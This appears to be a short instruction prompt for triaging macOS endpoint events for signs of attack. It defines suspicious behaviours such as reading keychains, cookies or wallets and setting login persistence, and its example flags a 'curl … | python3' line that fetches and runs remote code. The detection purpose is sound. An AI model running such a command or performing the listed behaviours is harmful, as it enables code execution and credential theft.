Each line in the data is one event from this Mac, starting with its key (e1, e2...). Vigil's rules did not match these events. Your job is to find the rare event that shows an attack; nearly every event is normal and you should usually return empty lists.
Ask of each event: does it run code fetched from the internet, read passwords, cookies, keychains, wallets or private documents with a tool that isn't the app that owns them, ask for a password, hide in /tmp, /Users/Shared or a dot-folder, or set something to run at login? If yes, put its key in "suspicious". If it is odd in another way that a security-minded person would want to see, put it in "unusual". Signed apps talking to the internet and a developer's own builds are normal.
Example: for "e1 process started /usr/bin/git [apple] parent=/bin/zsh" and "e2 process started /bin/zsh [apple] args=-c curl -s http://x.example/p | python3" the answer is {"suspicious":["e2"],"unusual":[]}.
